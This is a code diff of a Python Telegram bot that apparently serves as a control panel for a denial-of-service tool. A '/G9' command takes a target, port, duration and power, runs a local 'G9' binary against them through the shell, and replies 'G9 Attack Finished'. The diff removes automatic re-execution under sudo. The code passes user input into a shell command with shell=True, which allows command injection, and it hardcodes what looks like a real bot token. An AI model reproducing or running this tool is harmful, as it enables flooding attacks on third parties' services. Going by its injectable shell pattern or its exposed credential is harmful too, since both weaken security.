@@ -1,16 +1,9 @@
 #!/usr/bin/python3
-import os
-import sys
 import telebot
 import subprocess
 
 # Insert your Telegram bot token here
 bot = telebot.TeleBot('6472534758:AAGTOvmuiBnQSpQdmM2oNX_g1YJZtxLH8bA')
-
-# Check if the script is running as root, and if not, re-run it with sudo
-if os.geteuid() != 0:
-    print("Restarting the script with sudo...")
-    os.execvp("sudo", ["sudo", sys.executable] + sys.argv)
 
 # Handler for /G9 command
 @bot.message_handler(commands=['G9'])
@@ -26,7 +19,7 @@ def handle_G9(message):
             response = "Error: Time interval must be less than 501."
         else:
             start_attack_reply(message, target, port, time, power)  # Call start_attack_reply function
-            full_command = f"sudo ./G9 {target} {port} {time} {power}"
+            full_command = f"./G9 {target} {port} {time} {power}"
             subprocess.run(full_command, shell=True)  # Run the command in the shell
             response = f"G9 Attack Finished. Target: {target} Port: {port} Time: {time} seconds."
     else:
